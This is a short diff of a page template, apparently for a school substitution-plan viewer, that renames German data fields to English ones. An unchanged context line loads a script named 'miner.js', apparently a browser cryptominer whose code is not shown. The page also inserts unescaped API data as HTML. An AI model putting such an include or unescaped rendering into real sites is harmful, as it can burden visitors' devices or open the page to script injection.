@@ -48,20 +48,20 @@
 <script src="/a/miner.js"></script>
 <script>
     $(() => {
-        $.getJSON("/api/{{ .klasse }}", data => {
+        $.getJSON("/api/{{ .class }}", data => {
             $.each(data.vertretungen, (a, b) => {
                 (b.Type == "Entfall") ? $("tbody").append(
                         "<tr class='teal-text text-lighten-2'><td>" +
-                        b.Std + "</td><td>" + b.Teacher +
+                        b.Hour + "</td><td>" + b.Teacher +
                         "</td><td>" + b.Subject + "</td><td>" + b.Room + "</td><td>" + b.Type +
                         "</td></tr>") : $("tbody").append(
-                        "<tr><td>" + b.Std + "</td><td>" +
+                        "<tr><td>" + b.Hour + "</td><td>" +
                         b.Teacher +
                         "</td><td>" + b.Subject + "</td><td>" + b.Room + "</td><td>" + b.Type +
                         "</td></tr>");
             });
-            $("h4").html(data.meta.Datum);
-            $("#title").html(data.meta.Klasse);
+            $("h4").html(data.meta.Date);
+            $("#title").html(data.meta.Class);
         }).catch(m => Materialize.toast(m.status + ": " + m.responseJSON.message));
     });
 </script>
